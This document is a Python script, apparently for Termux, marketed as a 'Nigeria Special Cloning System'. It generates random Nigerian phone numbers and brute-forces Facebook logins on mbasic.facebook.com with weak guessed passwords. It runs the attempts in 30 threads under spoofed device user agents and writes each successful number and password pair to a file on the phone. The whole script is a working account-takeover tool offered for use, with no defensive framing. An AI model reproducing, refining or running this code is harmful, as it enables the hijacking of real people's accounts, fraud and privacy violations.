# NIGERIA SPECIAL CLONING SYSTEM
# AUTHOR : CHARSI BRAND
# REGION : NIGERIA (MTN, AIRTEL, GLO)
# STATUS : FULL BOLD & WORKING

import os, sys, re, time, random, json, subprocess
from concurrent.futures import ThreadPoolExecutor as tred

#▬▭▬▭▬▭▬▭[ AUTO INSTALLER ]▬▭▬▭▬▭▬▭#
try:
    import requests
    from bs4 import BeautifulSoup as sop
except ImportError:
    print('\033[1;31m[!] INSTALLING MISSING MODULES...')
    os.system('pip install requests bs4')

#▬▭▬▭▬▭▬▭[ BOLD COLOR CODE ]▬▭▬▭▬▭▬▭#
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
WHITE = "\033[1;37m"
GREEN = "\033[1;32m"
RESET = "\033[0m"
STYLE = f"{WHITE}[{RED}●{WHITE}]"

#▬▭▬▭▬▭▬▭[ NIGERIA SPECIAL UA ]▬▭▬▭▬▭▬▭#
def get_ng_ua():
    # Focused on Infinix/Tecno which are popular in Nigeria
    model = random.choice(['Infinix X6833B', 'Infinix X676B', 'Tecno KJ6', 'Tecno AD10', 'Samsung SM-A125F'])
    version = random.randint(10, 13)
    chrome = f"{random.randint(110, 126)}.0.{random.randint(4000, 6000)}.{random.randint(10, 150)}"
    return f"Mozilla/5.0 (Linux; Android {version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{random.randint(400, 500)}.0.0.0;]"

#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
logo = f"""{RED}
  ▄████▄   ██░ ██  ▄▄▄       ██▀███    ██████  ██▓
 ▒██▀ ▀█  ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██    ▒ ▓██▒
 ▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░ ▓██▄   ▒██░
 ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄    ▒   ██▒▒██░
 ▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒▒██████▒▒░██████▒
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{STYLE} {YELLOW}AUTHOR   {WHITE}: {RED}CHARSI BRAND
{STYLE} {YELLOW}REGION   {WHITE}: {RED}NIGERIA (NG)
{STYLE} {YELLOW}NETWORKS {WHITE}: {RED}MTN, AIRTEL, GLO, 9MOBILE
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

class NigeriaCloner:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []

    def menu(self):
        os.system('clear'); print(logo)
        print(f"{WHITE}[{YELLOW}1{WHITE}] {RED}START NIGERIA NUMBER CLONING")
        print(f"{WHITE}[{YELLOW}0{WHITE}] {RED}EXIT")
        choice = input(f"\n{YELLOW}SELECT {WHITE}: {RESET}")
        if choice == '1': self.ng_start()
        else: exit()

    def ng_start(self):
        os.system('clear'); print(logo)
        print(f"{STYLE} {YELLOW}NIGERIA CODES: 0803, 0806, 0703, 0813, 0802, 0905")
        code = input(f"{STYLE} {YELLOW}ENTER NETWORK CODE {WHITE}: {RESET}")
        try:
            limit = int(input(f"{STYLE} {YELLOW}LIMIT (e.g 5000) {WHITE}: {RESET}"))
        except: limit = 2000
        
        print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{STYLE} {YELLOW}CLONING STARTED... USE AIRPLANE MODE")
        print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        with tred(max_workers=30) as pool:
            for _ in range(limit):
                # Generating Nigeria Random Numbers (11 digits total)
                num = code + "".join(random.choices("0123456789", k=7))
                pws = [num, num[:6], num[:7], 'nigeria', 'nigeria123', '123456']
                pool.submit(self.crack, num, pws)
        
        print(f"\n{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{STYLE} {GREEN}OK: {len(self.oks)} {WHITE}| {STYLE} {RED}CP: {len(self.cps)}")

    def crack(self, user, pws):
        sys.stdout.write(f"\r{WHITE}[CHARSI] {self.loop} | {GREEN}OK:{len(self.oks)} {RED}CP:{len(self.cps)} "); sys.stdout.flush()
        try:
            for pw in pws:
                ua = get_ng_ua()
                ses = requests.Session()
                # Using Mbasic for low security bypass in NG region
                url = "https://mbasic.facebook.com/login.php"
                res = ses.get(url).text
                data = {
                    "lsd": re.search('name="lsd" value="(.*?)"', res).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', res).group(1),
                    "email": user,
                    "pass": pw,
                    "login": "Log In"
                }
                head = {
                    'Host': 'mbasic.facebook.com',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'referer': 'https://mbasic.facebook.com/',
                    'origin': 'https://mbasic.facebook.com'
                }
                post = ses.post(url, data=data, headers=head, allow_redirects=False)
                
                if "c_user" in ses.cookies.get_dict():
                    print(f"\n{GREEN}[CHARSI-OK] {user} | {pw}")
                    self.oks.append(user)
                    open('/sdcard/NG-OK.txt', 'a').write(f"{user}|{pw}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    # print(f"\n{RED}[CHARSI-CP] {user} | {pw}")
                    self.cps.append(user)
                    break
            self.loop += 1
        except: pass

if __name__ == "__main__":
    if not os.path.exists('/sdcard'): os.system('termux-setup-storage')
    NigeriaCloner().menu()
